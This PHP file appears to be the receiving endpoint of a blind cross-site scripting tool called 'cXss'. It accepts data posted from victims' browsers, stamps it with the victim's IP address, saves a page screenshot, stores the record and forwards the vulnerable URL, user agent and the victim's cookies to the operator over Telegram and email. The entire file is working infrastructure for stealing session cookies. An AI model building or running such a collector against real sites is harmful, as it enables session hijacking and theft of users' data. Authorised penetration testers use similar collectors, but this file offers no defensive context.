<?php
include("inc/conf.php");

if(isset($_POST['data'])){
	$c = rand_str();
	$n = countDb($db);
	$obj = json_decode($_POST['data']);
	$obj->ip_address = getUserIP();
	$obj->datetime = date("d-m-Y H:i:s");
	$obj->id = $n;
	createImg($obj->screenshot, $c);
	$obj->screenshot = "../screenshot/".$c.".png";
	$data = json_encode($obj);

	$d = json_decode($data);
	$message = "XSS Captured [".$d->datetime."]\n\nURL : `".$d->origin."`\nVuln Url : `".$d->uri."`\nReferer : `".$d->referer."`\nVictim IP : `".$d->ip_address."`\nVictim User Agent : \n`".$d->user_agent."`\n\nCookies : \n`".$d->cookies."`\n\nThanks For Using cXss\nFrom : `".$_SERVER['HTTP_HOST']."`";

	// Send Notify to Telegram
	if(!empty($token)&&!empty($idRecipient)){
		echo sendTelegram($token, $idRecipient, $message);
	}

	// Send Notify To Email
	if(!empty($email)){
		$subject = "XSS Captured [".$d->origin."]";
		echo sendEmail($email, $subject, str_replace("`", "", $message));
	}
	header('Content-Type: application/json');
	echo insert($db, $n, $data);	
}else{
	die("<h1>403 Forbidden !</h1>");	
}

